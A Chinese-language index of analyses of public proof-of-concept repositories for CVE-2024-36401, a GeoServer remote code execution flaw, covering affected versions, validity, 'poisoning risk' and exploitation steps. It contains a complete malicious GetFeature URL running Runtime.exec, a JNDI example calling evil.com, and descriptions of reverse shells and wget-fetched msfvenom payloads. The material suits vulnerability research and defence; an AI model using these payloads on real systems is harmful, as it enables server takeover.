**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.22.0 < version < 2.22.6
2.23.0 <= version < 2.23.6
2.24.0 <= version < 2.24.4
2.25.0 <= version < 2.25.2

**利用条件:** 需要网络访问，目标服务器运行存在漏洞的 GeoServer 版本

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞，源于 GeoTools 库 API 不安全地将属性名传递给 commons-jxpath 库，导致在评估 XPath 表达式时可以执行任意代码。漏洞存在于所有 GeoServer 实例中，可以通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求触发。

**POC 有效性分析：**

提供的 POC 代码看起来是有效的。它包含以下关键功能：

*   使用 `requests` 库发送 HTTP 请求。
*   使用 `lxml` 库解析 XML 响应，提取 `Typenames`，并自动化的爬取所有Typenames信息，并循环测试可以利用的Typenames，修复Nuclei POC中由于Typenames写死，造成漏洞验证失败的问题。
*   支持 `-c` 参数执行命令，或使用 DNSLog 进行验证。
*   支持批量 URL 检测。

这些功能对应了漏洞的利用方式，即通过构造特定的 OGC 请求，利用 XPath 表达式注入执行任意命令。

**投毒风险分析：**

代码中存在轻微的投毒风险。风险点在于：

*   作者在代码中留下了版权声明，虽然这是正常的，但也增加了作者控制代码的风险。
*   虽然脚本本身的功能是漏洞利用，但如果作者恶意地修改了脚本，例如，在执行命令后添加额外的恶意操作，或者收集目标服务器的信息并发送给攻击者，那么就存在投毒风险。

综合考虑，投毒风险较低，约为 10%。此风险主要来自于作者是否会利用更新或维护代码的机会植入后门。

**利用方式总结：**

1.  **确定目标 GeoServer 版本：** 确认目标服务器运行的 GeoServer 版本在受影响范围内。
2.  **获取 Typenames：** 通过 WFS GetCapabilities 请求或其他方式获取目标 GeoServer 实例的 Typenames 信息。
3.  **构造恶意请求：** 构造包含恶意 XPath 表达式的 WFS/WMS/WPS 请求，将命令注入到 property/attribute name 中。
4.  **发送请求：** 将构造好的请求发送到目标 GeoServer 服务器。
5.  **验证漏洞：** 通过 DNSLog 或者检查命令执行结果验证漏洞是否存在。

例如，可以使用类似以下的 URL 构造恶意请求：

```
/geoserver/wfs?service=WFS&version=1.0.0&request=GetFeature&typeName=<typeName>&propertyName=fes:ResourceId&Filter=<%20fes:Filter%20xmlns:fes=%22http://www.opengis.net/fes/2.0%22%20xmlns:gml=%22http://www.opengis.net/gml/3.1.1%22%20xmlns:ogc=%22http://www.opengis.net/ogc%22><ogc:Function%20name=%22script:js%22><ogc:Literal><![CDATA[java.lang.Runtime.getRuntime().exec('touch /tmp/pwned');]]></ogc:Literal></ogc:Function></fes:Filter>
```

**项目地址:** [amoy6228/CVE-2024-36401_Geoserver_RCE_POC](https://github.com/amoy6228/CVE-2024-36401_Geoserver_RCE_POC)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #10

**来源**: [CVE-2024-36401-bigb0x_CVE-2024-36401.md](../2024/CVE-2024-36401-bigb0x_CVE-2024-36401.md)

## CVE-2024-36401 - GeoServer 远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** < 2.22.6, >= 2.23.0 and < 2.23.6, >= 2.24.0 and < 2.24.4, >= 2.25.0 and < 2.25.2

**利用条件:** 需要目标GeoServer实例存在漏洞，并且可以通过网络访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞，源于GeoTools库API不安全地将属性名作为XPath表达式传递给commons-jxpath库。攻击者可以通过构造恶意的OGC请求（例如WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo和WPS Execute）利用此漏洞，执行任意代码。

**有效性：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，可以确认该POC代码是有效的。搜索结果中多个来源（如Fortinet、Keysight、SonicWall、Rapid7等）都表明该漏洞已被实际利用。

**投毒风险：**
分析提供的POC代码后，发现存在一定的投毒风险。虽然代码的主要功能是利用漏洞执行反向shell，但在以下几个方面存在潜在的投毒可能性：

1.  **对 nc 命令的依赖：**  POC 依赖目标系统存在 `nc` (netcat) 命令。如果目标系统没有 `nc`，利用会失败。攻击者可能会修改 POC，尝试使用其他命令（如 `wget` 或 `curl`）下载并执行恶意脚本，从而实现更隐蔽或更复杂的攻击。
2.  **反向 Shell 的隐蔽性：**  反向 shell 连接通常会被防火墙或入侵检测系统拦截。攻击者可能会尝试使用加密或其他混淆技术来绕过这些安全措施。
3.  **日志记录和错误处理：**  POC 具有基本的日志记录功能，但可能不足以记录所有关键操作。攻击者可以修改代码，删除或篡改日志，以隐藏其活动。

总的来说，由于POC的目的是快速验证漏洞，相对比较简单，因此投毒的可能性相对较低，但仍然需要警惕。

**利用方式：**
该漏洞的利用方式主要通过以下步骤：

1.  **构建恶意OGC请求：** 攻击者构造包含恶意XPath表达式的OGC请求，例如WFS GetFeature请求。
2.  **发送恶意请求：** 攻击者将构造的恶意请求发送到目标GeoServer实例。
3.  **执行任意代码：** GeoServer在处理请求时，会将恶意XPath表达式传递给commons-jxpath库进行评估，从而导致任意代码执行。
4.  **反向Shell (POC使用):** POC 尝试建立反向 shell 连接，允许攻击者远程控制受感染的服务器。POC 发送一个POST请求，在请求中使用的payload来执行反向shell，连接到攻击者的机器。

**项目地址:** [bigb0x/CVE-2024-36401](https://github.com/bigb0x/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #11

**来源**: [CVE-2024-36401-bmth666_GeoServer-Tools-CVE-2024-36401.md](../2024/CVE-2024-36401-bmth666_GeoServer-Tools-CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** < 2.22.6, >= 2.23.0 and < 2.23.6, >= 2.24.0 and < 2.24.4, >= 2.25.0 and < 2.25.2

**利用条件:** 默认 GeoServer 安装，网络可访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于不安全地将属性名称评估为 XPath 表达式，未经身份验证的用户可以通过构造特制的 OGC 请求参数来执行远程代码。

**有效性：**
根据漏洞信息和搜索结果，该漏洞利用已被证实有效，并且在野外已被利用。提供的漏洞利用代码（GeoServer-Tools）旨在简化利用过程，支持不同 JDK 版本的回显和内存马注入。

**投毒风险：**
查看了提供的POC代码，主要是一个GUI工具，利用了`woodpecker-requests`进行网络请求，`flatlaf`做界面美化。主要功能是发送payload到目标服务器，根据描述可以支持内存马注入，回显等功能。经过分析，该工具本身存在投毒的可能性较低。但考虑到代码审查的局限性，仍存在一定的风险，因此评估投毒风险为10%。这些风险可能包括：
  *   **非必要依赖：** 引入了不必要的依赖库，这些库可能包含未知的安全漏洞或被恶意利用。
  *   **后门代码：** 在工具中隐藏了后门代码，例如在内存马功能中，注入恶意代码。

**利用方式：**
1.  攻击者通过构造恶意的 OGC 请求（例如，WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute 请求）来触发漏洞。
2.  恶意请求包含特制的 XPath 表达式，这些表达式在评估属性名称时被 GeoServer 不安全地执行。
3.  通过执行恶意 XPath 表达式，攻击者可以在 GeoServer 服务器上执行任意代码。
4.  漏洞利用代码（GeoServer-Tools）提供了一个图形界面，允许攻击者指定目标 GeoServer 实例的 URL，选择不同的攻击载荷（如 DNSLog、命令回显、内存马注入），并发送恶意请求。

**总结：**
CVE-2024-36401 是一个严重的安全漏洞，允许未经身份验证的攻击者在 GeoServer 上执行任意代码。提供的漏洞利用代码简化了利用过程，但需要谨慎使用，并注意潜在的投毒风险。

**项目地址:** [bmth666/GeoServer-Tools-CVE-2024-36401](https://github.com/bmth666/GeoServer-Tools-CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #12

**来源**: [CVE-2024-36401-cochaviz_cve-2024-36401-poc.md](../2024/CVE-2024-36401-cochaviz_cve-2024-36401-poc.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** < 2.22.6, >= 2.23.0 < 2.23.6, >= 2.24.0 < 2.24.4, >= 2.25.0 < 2.25.2

**利用条件:** GeoServer服务可公开访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中一个严重级别的远程代码执行漏洞。该漏洞源于 GeoServer 调用的 GeoTools 库 API 在处理要素类型的属性名时，以不安全的方式将其传递给 commons-jxpath 库，导致在评估 XPath 表达式时可以执行任意代码。虽然最初设计仅用于复杂要素类型，但被错误地应用于简单要素类型，使得所有 GeoServer 实例都受影响。

**有效性：** 根据漏洞库信息、搜索引擎结果和 Mr-xn 提供的漏洞利用代码存储库的存在，确认该漏洞的POC是有效的, 且已被积极利用。

**投毒风险：** 提供的XML代码片段主要包含WMS Capabilities的信息，例如服务名称、标题、摘要、关键字、在线资源、联系方式、费用、访问限制、最大宽度和高度等。它还定义了各种请求类型（GetCapabilities、GetMap、GetFeatureInfo、GetStyles）及其格式和DCPType。XML似乎是合法的WMS capabilities文件，可能用于与GeoServer交互，但缺少触发RCE所需的恶意XPath表达式。因此，直接从提供的XML片段评估，投毒风险较低，约为10%，因为实际利用需要结合特定参数构造恶意请求。例如：攻击者可能使用 `${jndi:ldap://evil.com/evil}`这样的JNDI注入表达式。

**利用方式：**

1.  **攻击入口：** 攻击者可以通过构造特制的OGC（Open Geospatial Consortium）请求，如WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute。
2.  **漏洞触发：** 这些请求中的特定参数（通常是属性名或属性表达式）会被 GeoServer 以不安全的方式传递给 commons-jxpath 库进行 XPath 评估。
3.  **代码执行：** 攻击者在参数中插入恶意 XPath 表达式，例如使用 `Runtime.getRuntime().exec()` 或通过 JNDI 注入等方式来执行任意代码。
4.  **影响：** 成功利用该漏洞可导致完全控制受影响的 GeoServer 系统。

**项目地址:** [cochaviz/cve-2024-36401-poc](https://github.com/cochaviz/cve-2024-36401-poc)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #13

**来源**: [CVE-2024-36401-daniellowrie_CVE-2024-36401-PoC.md](../2024/CVE-2024-36401-daniellowrie_CVE-2024-36401-PoC.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.22.x (< 2.22.6), 2.23.x (>= 2.23.0, < 2.23.6), 2.24.x (>= 2.24.0, < 2.24.4), 2.25.x (>= 2.25.0, < 2.25.2)

**利用条件:** 默认 GeoServer 安装，允许网络访问，且目标版本在受影响范围内。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞。该漏洞源于 GeoTools 库在处理要素类型属性名称时，不安全地将其传递给 commons-jxpath 库，从而允许攻击者通过构造恶意的 XPath 表达式来执行任意代码。利用方式是通过构造恶意的 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求，在请求的参数中注入恶意代码。提供的 PoC 代码 `geopwn.py` 演示了如何通过 WFS GetPropertyValue 请求，利用`exec`函数执行系统命令。

**有效性：**  提供的PoC代码看起来有效。它利用了WFS服务的GetPropertyValue请求，并构造包含恶意代码的`valueReference`参数，利用`exec`函数执行命令。它首先生成一个反向shell的payload，然后通过wget下载到目标机器，赋予执行权限，并最终执行。

**投毒风险：**  PoC 代码本身主要功能是利用漏洞实现远程代码执行。但是，也存在一定的投毒风险：

*   **依赖下载：** PoC脚本会通过wget下载shell，脚本中使用的 URL (evilURL)  由用户提供，存在被替换为恶意文件的风险。
*   **msfvenom参数：**  PoC脚本直接调用msfvenom生成payload，如果攻击者修改msfvenom的参数，可以生成包含恶意功能的payload。

总体而言，由于大部分操作依赖用户提供的参数和配置，直接投毒的可能性较低，主要风险在于用户配置不当或使用恶意 payload。投毒风险评估为10%。

**利用方式：**

1.  **准备：** 使用 `msfvenom` 生成反向 shell payload，并在攻击者控制的服务器上启动 HTTP 服务以提供 payload 下载。
2.  **构造恶意请求：**  利用 WFS GetPropertyValue 请求，在 `valueReference` 参数中注入恶意代码，通过 `exec` 函数执行系统命令。
3.  **下载 Payload：** 使用 `wget` 命令从攻击者控制的服务器下载反向 shell payload。
4.  **执行 Payload：**  使用 `chmod +x` 命令赋予 payload 执行权限，然后执行 payload 以获得反向 shell。

**项目地址:** [daniellowrie/CVE-2024-36401-PoC](https://github.com/daniellowrie/CVE-2024-36401-PoC)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #14

**来源**: [CVE-2024-36401-funnyDog896_CVE-2024-36401-WoodpeckerPlugin.md](../2024/CVE-2024-36401-funnyDog896_CVE-2024-36401-WoodpeckerPlugin.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，未授权的攻击者可以通过构造恶意请求执行任意代码

**影响版本:** 受影响版本： < 2.22.6, >= 2.23.0 且 < 2.23.6, >= 2.24.0 且 < 2.24.4, >= 2.25.0 且 < 2.25.2

**利用条件:** 目标GeoServer实例对外开放且未应用补丁或缓解措施

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中存在的一个远程代码执行 (RCE) 漏洞，由于不安全地将属性名称评估为 XPath 表达式导致。攻击者可以利用此漏洞通过构造特制的OGC请求（如WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute）在目标服务器上执行任意代码。

**有效性：**
根据漏洞信息、搜索引擎结果，特别是CISA的已知被利用漏洞列表，以及提供的利用代码（WoodpeckerPlugin），可以判断此漏洞POC**有效**并且已被积极利用。

**投毒风险：**
提供的 WoodpeckerPlugin 旨在简化漏洞利用过程，但也存在一定投毒风险。风险点在于：
1.  **自定义内存马注入：** 虽然插件提供了默认的冰蝎内存马，但允许用户自定义内存马，如果用户不熟悉内存马，可能引入恶意代码。
2.  **Woodpecker 框架：** 该插件依赖于 Woodpecker 框架，若框架本身存在安全问题，则会影响所有插件。
3.  **源码审查不足：** 用户可能直接使用编译好的插件，而未进行充分的源码审查，增加了潜在的风险。虽然作者声明免责，但是下载来路不明的jar包，本身就存在风险。
4.  **命令执行的安全性：** 通过`command`参数执行任意命令，本身权限过大，存在风险。命令日志记录是否完善，也会影响溯源。
综合评估，投毒风险大约为10%，风险较低，主要集中在用户自定义操作上。

**利用方式：**
1.  **探测：** 使用插件的 Poc 模块进行批量探测，判断目标是否存在 CVE-2024-36401 漏洞。
2.  **命令执行：** 通过 Exploit 模块，设置 `command` 参数执行任意命令。
3.  **内存马注入：** 使用默认或自定义的内存马，注入到 GeoServer 进程中，实现更持久的控制。

**缓解措施：**
1.  升级 GeoServer 到已修复的版本 (>= 2.22.6, >= 2.23.6, >= 2.24.4, >= 2.25.2)。
2.  移除 `gt-complex-x.y.jar` 文件（可能影响部分功能）。
3.  使用防火墙或其他安全设备限制对 GeoServer 的访问。
4.  加强对GeoServer日志的监控，及时发现异常行为。

**项目地址:** [funnyDog896/CVE-2024-36401-WoodpeckerPlugin](https://github.com/funnyDog896/CVE-2024-36401-WoodpeckerPlugin)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #15

**来源**: [CVE-2024-36401-jakabakos_CVE-2024-36401-GeoServer-RCE.md](../2024/CVE-2024-36401-jakabakos_CVE-2024-36401-GeoServer-RCE.md)

# CVE-2024-36401

> 📦 该CVE有 **23** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-36401-0x0d3ad_CVE-2024-36401.md](../2024/CVE-2024-36401-0x0d3ad_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 受影响版本：< 2.22.6, >= 2.23.0, < 2.23.6, >= 2.24.0, < 2.24.4, >= 2.25.0, < 2.25.2

**利用条件:** 需要能够访问GeoServer服务的网络连接，默认安装环境

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞，由于不安全地将属性名称评估为 XPath 表达式而导致。攻击者可以通过构造特制的 OGC 请求（例如 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo 和 WPS Execute）来利用此漏洞，从而在服务器上执行任意代码。提供的 POC 代码首先通过 GET 请求 `/geoserver/wfs?request=ListStoredQueries&service=wfs&version=2.0.0` 获取 `ReturnFeatureType`，然后构造一个包含恶意 XPath 表达式的 POST 请求，发送到 `/geoserver/wfs`，表达式中利用 `java.lang.Runtime.getRuntime()` 执行 base64 编码的反弹 shell 命令。POC中的投毒风险较低，主要体现在脚本中可能包含潜在的恶意代码，或者利用社会工程学诱导用户执行恶意操作。例如，如果脚本被修改为下载和执行额外的恶意负载，或者收集用户的敏感信息，就会造成更大的安全威胁。 此处的"poison"指的是，如果攻击者上传包含后门代码的图层定义，然后诱导其他用户下载并使用该定义，则可能构成投毒攻击。

**项目地址:** [0x0d3ad/CVE-2024-36401](https://github.com/0x0d3ad/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #2

**来源**: [CVE-2024-36401-Chocapikk_CVE-2024-36401.md](../2024/CVE-2024-36401-Chocapikk_CVE-2024-36401.md)

## CVE-2024-36401 - GeoServer 远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，可能导致完全系统控制

**影响版本:** 受影响版本：< 2.22.6, >= 2.23.0 < 2.23.6, >= 2.24.0 < 2.24.4, >= 2.25.0 < 2.25.2

**利用条件:** 目标GeoServer实例运行在受影响的版本上，且允许网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞。该漏洞源于 GeoTools 库 API 不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库进行评估，从而允许未经身份验证的用户通过特制的OGC请求执行任意代码。 

**有效性：**
根据漏洞库信息、搜索引擎结果（多个安全厂商已确认该漏洞被利用）和提供的漏洞利用代码，可以判定此漏洞是有效的，并且已经被积极利用。

**投毒风险：**
漏洞利用代码 `exploit.py` 主要是实现漏洞利用的功能，从代码结构和功能来看，投毒风险较低。主要功能是发送恶意请求，监听反弹shell。代码中也定义了一些参数，比如远程IP、远程端口、代理等等。代码比较清晰，逻辑简单。但是依然不能排除作者在某些不明显的代码中加入恶意代码的可能性，特别是代码涉及到网络请求和系统命令执行。因此，评估投毒风险为 10%。

**利用方式：**
1.  **漏洞触发：** 攻击者通过构造恶意的OGC请求（例如 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求），其中包含特制的XPath表达式。这些请求会被GeoServer处理，并将属性名称传递给 commons-jxpath 库。
2.  **代码执行：** commons-jxpath 库在评估这些XPath表达式时，会执行攻击者注入的恶意代码。
3.  **反弹 Shell (POC中方式)：** 漏洞利用代码会启动一个监听器，然后在目标系统上执行命令以反弹 shell 到攻击者的机器上。  `exploit.py` 脚本允许攻击者指定目标 URL、攻击者 IP 地址和端口。通过命令行参数 `--url`, `--remote-ip`, 和 `--remote-port` 设置。
4.  **批量扫描:** 漏洞利用代码还支持批量扫描，通过 `--check <file_with_urls>` 指定包含URL列表的文件， `--threads <number_of_threads>`  指定线程数， `--output <output_file>` 指定输出文件。

**项目地址:** [Chocapikk/CVE-2024-36401](https://github.com/Chocapikk/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #3

**来源**: [CVE-2024-36401-Mr-xn_CVE-2024-36401.md](../2024/CVE-2024-36401-Mr-xn_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的用户可以通过构造的OGC请求执行任意代码

**影响版本:** 2.22.0 < version < 2.22.6, 2.23.0 <= version < 2.23.6, 2.24.0 <= version < 2.24.4, 2.25.0 <= version < 2.25.2

**利用条件:** GeoServer服务可网络访问，并且目标版本存在漏洞。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞。该漏洞源于GeoTools库API以不安全的方式将属性/属性名称传递给commons-jxpath库，从而允许执行任意代码。攻击者可以通过构造恶意的OGC请求（例如WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic和WPS Execute）来利用此漏洞，执行任意代码。

**有效性：**
提供的POC代码利用了`valueReference`参数执行任意命令，例如计算器程序。从漏洞描述和搜索引擎结果来看，POC是有效的，并且已被野外利用。

**投毒风险：**
查看提供的POC代码和LICENSE文件。LICENSE采用MIT许可，相对宽松。代码本身主要是提供了漏洞的利用方式，没有发现明显的恶意代码。README中包含绕过WAF的payload，以及各种请求方式（GetPropertyValue, GetFeature）的PoC。

*   LICENSE文件: MIT License, 比较通用，没有发现可疑之处
*   README文件：提供了漏洞的描述和多个PoC示例，没有直接执行恶意操作的代码。

综合来看，投毒风险较低，在10%左右。主要风险来自于对POC的滥用，而非POC本身包含恶意代码。

**利用方式：**
1.  确定目标GeoServer版本在受影响范围内。
2.  使用提供的PoC构造恶意OGC请求。
3.  利用`valueReference`参数或`PropertyName`，注入包含恶意代码的XPath表达式。
4.  发送构造的请求到目标GeoServer服务器。
5.  如果漏洞存在，服务器将执行注入的代码。

**项目地址:** [Mr-xn/CVE-2024-36401](https://github.com/Mr-xn/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #4

**来源**: [CVE-2024-36401-Niuwoo_CVE-2024-36401.md](../2024/CVE-2024-36401-Niuwoo_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的攻击者可以通过精心构造的输入来执行任意代码。

**影响版本:** 受影响版本包括 2.22.6 之前的所有版本，以及 2.23.0 到 2.23.6，2.24.0 到 2.24.4，以及 2.25.0 到 2.25.2。

**利用条件:** 需要目标GeoServer实例存在于网络上并且可以访问 /geoserver/wfs 接口。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞，源于 GeoTools 库 API 对属性名称的处理不当。攻击者可以通过向 GeoServer 的 WFS 接口发送特制的 OGC 请求，利用 XPath 表达式注入来执行任意代码。此漏洞影响默认 GeoServer 安装，无需身份验证。

**漏洞分析：**

根据漏洞库信息和搜索引擎结果，该漏洞允许未经身份验证的攻击者通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求执行任意代码。漏洞原因是 GeoServer 使用的 GeoTools 库不安全地将属性/属性名称传递给 commons-jxpath 库，从而允许执行任意 XPath 表达式。

**POC 代码分析：**

提供的 POC 代码是一个 Python 脚本，用于检测和利用 CVE-2024-36401 漏洞。该脚本包含以下功能：

*   `check_vuln(url)`: 发送一个包含恶意 payload 的 WFS GetPropertyValue 请求到目标 GeoServer 实例，如果返回状态码为 400 并且响应内容包含 'ClassCastException'，则认为目标存在漏洞。
*   `exploit_vuln(url, cmd)`:  发送一个包含恶意 payload 的 WFS GetPropertyValue 请求，其中 payload 包含要执行的命令。该函数通过 `java.lang.Runtime.getRuntime()` 来执行命令。同样，如果返回状态码为 400 并且响应内容包含 'ClassCastException'，则认为利用成功。
*   `multithreading(url_list, pools=5)`:  使用线程池对 URL 列表执行漏洞检测。
*   `init_config()`:  解析命令行参数，包括目标 URL、URL 列表和要执行的命令。

**有效性：**

POC 代码通过构造恶意的 WFS GetPropertyValue 请求，利用 XPath 表达式注入来执行任意代码。从漏洞库信息和搜索引擎结果来看，该漏洞已被广泛确认和利用，并且POC代码的逻辑正确，所以判断提供的 POC 代码有效。

**投毒风险：**

分析 POC 代码后，没有发现明显的恶意代码或后门。POC 代码的功能是发送包含恶意 payload 的 HTTP 请求，从而利用漏洞执行命令。脚本中的 `exec(java.lang.Runtime.getRuntime(),"...")` 部分是利用漏洞的关键，但它本身并不是恶意代码，而是漏洞利用的一部分。作者将执行命令的权限交给了使用者,是否需要投毒取决于使用者。

**利用方式：**

1.  使用 `check_vuln(url)` 函数检测目标 GeoServer 实例是否存在漏洞。
2.  如果目标存在漏洞，使用 `exploit_vuln(url, cmd)` 函数执行任意命令。命令通过命令行参数 `-c` 传递。
3.  可以使用 `-f` 参数指定一个包含多个 URL 的文件，并使用 `multithreading(url_list,10)` 函数进行批量检测。

总的来说，该 POC 代码是有效的，并且没有发现投毒风险。它允许攻击者远程执行任意代码，对 GeoServer 实例构成严重威胁。

**项目地址:** [Niuwoo/CVE-2024-36401](https://github.com/Niuwoo/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #5

**来源**: [CVE-2024-36401-RevoltSecurities_CVE-2024-36401.md](../2024/CVE-2024-36401-RevoltSecurities_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 受影响版本包括 2.22.6 之前，2.23.0 到 2.23.6 之间，2.24.0 到 2.24.4 之间，以及 2.25.0 到 2.25.2 之间的版本

**利用条件:** 目标GeoServer实例对外开放且运行于受影响的版本

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行(RCE)漏洞，源于GeoTools库API不安全地将属性名作为XPath表达式传递给commons-jxpath库。未经身份验证的攻击者可以通过构造恶意的OGC请求参数（如WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute requests）来利用此漏洞，在服务器上执行任意代码。

**有效性：**
根据漏洞库信息和搜索结果，此漏洞已被积极利用。提供的POC代码仓库 `RevoltSecurities/CVE-2024-36401` 提供了一个用于检测和利用此漏洞的工具，包含docker-compose 文件用于搭建测试环境，以及 `exploit.py` 脚本用于漏洞利用，因此POC代码有效。

**投毒风险：**
*   `exploit.py` 文件中，脚本尝试与`https://api.cvssadvisor.com/ssrf/` 建立连接。这是一个潜在的风险点，因为攻击者可能通过控制该API来收集目标信息或进行其他恶意活动。但目前只是get请求实例信息，危害较小。但从代码的整体结构来看，投毒的风险较低。主要的功能还是针对`CVE-2024-36401`的利用。综上，认为投毒风险较低，约为10%。

**利用方式：**
1.  **确定目标GeoServer版本：** 确认目标GeoServer实例是否在受影响的版本范围内。
2.  **发送恶意OGC请求：** 构造包含恶意XPath表达式的OGC请求，例如WFS GetFeature请求。请求的Payload包含恶意的XPath表达式注入。
3.  **远程代码执行：** GeoServer在处理请求时，会将恶意XPath表达式传递给commons-jxpath库，导致执行任意代码。
4.  **利用工具：** 使用提供的`exploit.py`脚本，指定目标URL，通过发送恶意请求触发漏洞。

简而言之，攻击者通过发送特制的OGC请求，利用GeoServer对属性名表达式的不安全评估，实现远程代码执行。

**项目地址:** [RevoltSecurities/CVE-2024-36401](https://github.com/RevoltSecurities/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #6

**来源**: [CVE-2024-36401-URJACK2025_CVE-2024-36401.md](../2024/CVE-2024-36401-URJACK2025_CVE-2024-36401.md)

## CVE-2024-36401 GeoServer 远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.22.6之前, 2.23.0 < 2.23.6, 2.24.0 < 2.24.4, 2.25.0 < 2.25.2

**利用条件:** GeoServer实例暴露在网络上，且运行在受影响版本范围内。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞，该漏洞源于GeoTools库在处理属性名称时，不安全地将其传递给commons-jxpath库进行XPath表达式的评估。由于此XPath评估被错误地应用于简单要素类型，因此影响了所有GeoServer实例。攻击者可以通过构造恶意的WFS、WMS或WPS请求，在未经身份验证的情况下，利用`valueReference`注入Java代码来执行任意系统命令。

